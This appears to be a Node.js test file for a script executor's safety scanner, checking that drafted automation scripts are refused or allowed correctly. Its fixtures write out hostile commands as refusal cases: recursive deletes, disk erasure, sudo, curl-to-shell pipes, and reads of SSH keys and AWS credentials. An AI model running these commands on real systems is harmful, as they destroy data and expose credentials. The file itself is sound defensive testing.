'use strict';
const test = require('node:test');
const assert = require('node:assert');
const { run, scan, hashScript, runnerFor } = require('../main/executor.js');

// NOTE ON THE FIXTURES BELOW.
//
// This file contains strings that look like destructive commands. None of them
// are executed: every one is an assertion that scan() REFUSES it. A scanner
// tested only on safe input tests nothing, so the dangerous strings have to be
// written down somewhere, and here is the right place.
//
// The scan is the LAST line of defence, not the first — a human reading the
// script and a successful manual run both come before it. These assert it
// catches the things that would be unrecoverable if a review were rushed.

test('destroying data is refused', () => {
  for (const s of [
    'rm -rf ~/Documents',
    'rm -f /tmp/thing',
    'dd if=/dev/zero of=/dev/disk2',
    'diskutil eraseDisk JHFS+ x disk2',
    'shred ~/notes.txt',
  ]) {
    assert.equal(scan(s).safe, false, `must refuse: ${s}`);
  }
});

test('privilege escalation is refused', () => {
  for (const s of ['sudo rsync -a a b', 'doas make install', 'chmod -R 777 /']) {
    assert.equal(scan(s).safe, false, `must refuse: ${s}`);
  }
});

test('running code nobody reviewed is refused', () => {
  // The whole premise is that a human read the script. Anything that fetches
  // more code at runtime defeats that completely.
  for (const s of [
    'curl -s https://example.com/x.sh | sh',
    'wget -qO- https://example.com/x | bash',
    'echo aGk= | base64 -d | sh',
    'curl https://example.com/y | python3',
    'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x")',
  ]) {
    assert.equal(scan(s).safe, false, `must refuse: ${s}`);
  }
});

test('credential theft is refused', () => {
  for (const s of [
    'security find-generic-password -s github',
    'cat ~/.ssh/id_rsa',
    'cat ~/.aws/credentials',
  ]) {
    assert.equal(scan(s).safe, false, `must refuse: ${s}`);
  }
});

test('persistence and system state changes are refused', () => {
  for (const s of [
    'crontab -e',
    'launchctl load ~/x.plist',
    'shutdown -h now',
    'defaults write com.apple.finder X 1',
  ]) {
    assert.equal(scan(s).safe, false, `must refuse: ${s}`);
  }
});

test('the ordinary work these scripts exist to do is allowed', () => {
  // Refusing everything would be safe and useless. UI automation and reading
  // files are the entire point of drafting them.
  for (const s of [
    'curl -s "$EXPORT_URL" -o /tmp/latest.csv\nopen /tmp/latest.csv',
    'tell application "Numbers"\n activate\nend tell',
    'osascript -e \'tell application "System Events" to keystroke "c" using command down\'',
    'cp ~/Downloads/report.csv ~/Documents/reports/',
    'echo "done"',
  ]) {
    assert.equal(scan(s).safe, true, `must allow: ${s}`);
  }
});

test('every refusal says what it was protecting against', () => {
  const r = scan('sudo rm -rf /');
  assert.equal(r.safe, false);
  assert.ok(r.blocked.length >= 2, 'reports every reason, not just the first');
  for (const why of r.blocked) assert.ok(why.length > 4, 'each reason is human-readable');
});

test('approval is bound to the exact text', () => {
  const a = hashScript('echo hello');
  assert.equal(hashScript('echo hello'), a);
  // One character different is a different script, and a stale approval must
  // not carry over to it.
  assert.notEqual(hashScript('echo hello '), a);
  assert.notEqual(hashScript('echo hellO'), a);
});

test('a language with no runner cannot be executed', async () => {
  assert.ok(runnerFor('ruby').error, 'unlisted languages are refused');
  assert.ok(runnerFor('bash', 'win32').error, 'and so are wrong-platform ones');
  const r = await run({ script: 'puts 1', language: 'ruby' });
  assert.equal(r.status, 'blocked');
});

test('a blocked script never reaches a shell', async () => {
  const r = await run({ script: 'rm -rf /tmp/fren-should-not-exist', language: 'bash' });
  assert.equal(r.status, 'blocked');
  assert.match(r.output, /Refused before running/);
});

test('a safe script actually runs and its output comes back', async (t) => {
  if (process.platform === 'win32') return t.skip('bash test');
  const r = await run({ script: 'echo fren-executor-ok', language: 'bash' });
  assert.equal(r.status, 'ok');
  assert.match(r.output, /fren-executor-ok/);
});

test('a failing script is reported as failed, not thrown', async (t) => {
  if (process.platform === 'win32') return t.skip('bash test');
  const r = await run({ script: 'exit 3', language: 'bash' });
  assert.equal(r.status, 'failed');
});

test('a script that hangs is killed rather than left running', async (t) => {
  if (process.platform === 'win32') return t.skip('bash test');
  const r = await run({ script: 'sleep 30', language: 'bash', timeoutMs: 700 });
  assert.equal(r.status, 'failed');
  assert.match(r.output, /timed out/);
});

test('the script does not inherit this process environment', async (t) => {
  if (process.platform === 'win32') return t.skip('bash test');
  process.env.FREN_SECRET_CANARY = 'must-not-leak';
  try {
    const r = await run({ script: 'echo "[$FREN_SECRET_CANARY]"', language: 'bash' });
    assert.equal(r.status, 'ok');
    assert.ok(!/must-not-leak/.test(r.output),
      'a drafted script must not see arbitrary variables this process holds');
  } finally {
    delete process.env.FREN_SECRET_CANARY;
  }
});

// --- regressions from the execution audit -----------------------------------
// All three were demonstrated against the real executor before being fixed.

test('a script that backgrounds its work cannot report success', async (t) => {
  if (process.platform === 'win32') return t.skip('bash test');
  // This is the worst of the three. Reporting ok would mark the automation
  // VERIFIED, which is the gate that makes it eligible for scheduling — so a
  // script could earn a schedule while its real work never finished.
  const r = await run({
    script: '(sleep 30) &\necho started\n',
    language: 'bash',
    timeoutMs: 1200,
  });
  assert.notEqual(r.status, 'ok', 'work outliving the run must not count as success');
});

test('the timeout takes down the whole process group, not just the shell', async (t) => {
  if (process.platform === 'win32') return t.skip('posix process groups');
  const { execFileSync } = require('node:child_process');
  const marker = 'fren-audit-survivor';
  await run({
    script: `echo go; (sleep 25; echo ${marker}) & sleep 25`,
    language: 'bash',
    timeoutMs: 1000,
  });
  await new Promise((r) => setTimeout(r, 400));
  let alive = '';
  try { alive = execFileSync('pgrep', ['-f', 'sleep 25']).toString().trim(); } catch { alive = ''; }
  try { execFileSync('pkill', ['-f', 'sleep 25']); } catch { /* nothing left */ }
  assert.equal(alive, '', 'nothing the script started may outlive the run');
});

test('the interpreter is an absolute path, never resolved through PATH', () => {
  // Otherwise the hash binds the script while a writable directory earlier on
  // PATH decides what interpreting it means.
  const { RUNNERS } = require('../main/executor.js');
  for (const [name, r] of Object.entries(RUNNERS)) {
    const paths = r.cmd ? [r.cmd] : r.candidates;
    for (const p of paths) {
      assert.ok(p.startsWith('/') || /^[A-Z]:\\/.test(p),
        `${name} must name an absolute interpreter, got ${p}`);
    }
  }
});
